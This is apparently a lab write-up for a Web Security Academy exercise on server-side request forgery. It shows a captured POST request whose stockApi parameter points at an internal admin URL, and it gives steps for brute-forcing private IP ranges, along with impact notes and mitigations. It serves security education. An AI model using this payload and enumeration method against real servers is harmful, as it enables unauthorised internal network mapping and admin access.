# 📘 Scenario 2: SSRF with Internal IP Brute-Force via `stockApi`

## 🔎 Vulnerability Description

In this scenario, the web application still uses a vulnerable `stockAPI` parameter to perform server-side HTTP requests. However, instead of targeting a known internal endpoint like `localhost`, the attacker **brute-forces private IP ranges** (e.g., `192.168.x.x`) to discover and interact with internal services.

> **Vulnerability Type:** Input Validation  
> **OWASP Top 10 ID:** A10:2021 – Server-Side Request Forgery  
> **Risk Level:** Medium  

---

## 🔧 Target
**URL:**

🔗 https://0a76000a03398fbb85232bdb00be0076.web-security-academy.net/product/stock

---

## 📥 HTTP Request

```http
POST /product/stock HTTP/2
Host: 0a76000a03398fbb85232bdb00be0076.web-security-academy.net
Cookie: session=Yg3LWOSSMIf40kXSzoE79hhlrCXByHy6
Content-Length: 40
Sec-Ch-Ua: "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a76000a03398fbb85232bdb00be0076.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a76000a03398fbb85232bdb00be0076.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
 
stockApi=http://192.168.0.150:8080/admin

```
---
## 📥 Server Response
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3141

```
---

## 🧪 Exploitation Steps

Intercept the `POST` request using Burp Suite.

Modify `stockApi` parameter with different IP addresses in private ranges.

Observe the response:

HTTP 200 + HTML content → IP is reachable.

HTTP 502 / timeout → service not available.

Confirm which internal services respond to map internal network.

## 💥 Potential Impact

- **Internal network mapping**: Attackers can enumerate IP addresses and services not accessible from the internet.

- **Privilege escalation**: Access to admin panels, configuration endpoints, or cloud metadata APIs.

- **Pivot point**: Can be used in chained attacks to gain deeper access into protected zones.

## ✅ Mitigation Suggestions
Block all outbound server requests to private IP ranges unless explicitly allowed.

Use DNS resolution + IP validation to verify the legitimacy of destination URLs.

Rate-limit server-side request features to reduce brute-force attack surface.

Monitor abnormal request patterns and use network segmentation.

## 📸 Screenshot

![Exploitation Image Of Scenario 2](https://github.com/hovikhanh/ssrf-demo/images/Picture2.png "Exploitation Image Of Scenario 2")

## 🔗 References

[OWASP Testing Guide – Testing for SSRF](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery)

[HackTricks – SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)